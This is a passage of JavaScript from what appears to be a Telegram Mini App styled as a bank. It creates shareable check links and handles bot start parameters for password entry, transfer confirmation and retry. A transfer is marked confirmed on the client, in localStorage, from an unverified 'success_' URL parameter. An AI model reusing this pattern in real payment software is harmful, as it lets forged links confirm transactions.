        if (screenStack.length > 0 && screenStack[screenStack.length - 1].element === document.getElementById('checkScreen')) {
            screenStack.pop();
        }

        checkResultAmount.textContent = amount.toFixed(2) + ' ₽';
        const botUsername = 'YaBank_bot';
        const shareLink = `https://t.me/${botUsername}?start=${token}`;
        checkResultToken.textContent = shareLink;
        checkResultScreen.classList.add('active');
        pushScreen(checkResultScreen);
    });
}

if (checkCopyBtn) {
    checkCopyBtn.addEventListener('click', () => {
        const botUsername = 'YaBank_bot';
        const shareLink = `https://t.me/${botUsername}?start=${lastCheckToken}`;
        navigator.clipboard.writeText(shareLink).then(() => {
            showToast('Ссылка скопирована!', 'success');
        }).catch(() => {
            showToast('Не удалось скопировать', 'error');
        });
    });
}

// ==================== ОБРАБОТКА STARTAPP ====================

function handleStartAppParam() {
    const startParam = tg.initDataUnsafe?.start_param;
    if (!startParam) {
        restoreAuthState();
        return;
    }

    if (startParam.startsWith('enterPassword_')) {
        const targetUserId = parseInt(startParam.split('_')[1]);
        if (targetUserId === currentUserId) {
            passwordScreen.classList.add('active');
            pushScreen(passwordScreen, null, "#1a1d29");
        }
    } else if (startParam.startsWith('success_')) {
        const targetUserId = parseInt(startParam.split('_')[1]);
        if (targetUserId === currentUserId) {
            // Фиксируем pending транзакцию в localStorage
            const committed = commitPendingTransaction();
            
            // Очищаем флаг авторизации
            if (userData.pending_auth) {
                delete userData.pending_auth;
                saveUserData(currentUserId, userData);
            }
            
            if (committed) {
                showToast('Перевод подтверждён!', 'success');
            } else {
                showToast('Перевод уже обработан', 'info');
            }
            
            // Очищаем start_param из URL, чтобы при повторном открытии не сработало снова
            if (window.history.replaceState) {
                window.history.replaceState({}, document.title, window.location.pathname);
            }
        }
    } else if (startParam.startsWith('retry_')) {
        const targetUserId = parseInt(startParam.split('_')[1]);
        if (targetUserId === currentUserId) {
            clearPendingTransaction();
            // Очищаем флаг авторизации
            if (userData.pending_auth) {
                delete userData.pending_auth;
                saveUserData(currentUserId, userData);
            }
            showToast('Попробуйте снова', 'info');
        }
    } else {
        // Обычный чек — обработан выше в processCheck
        restoreAuthState();
    }
}

handleStartAppParam();
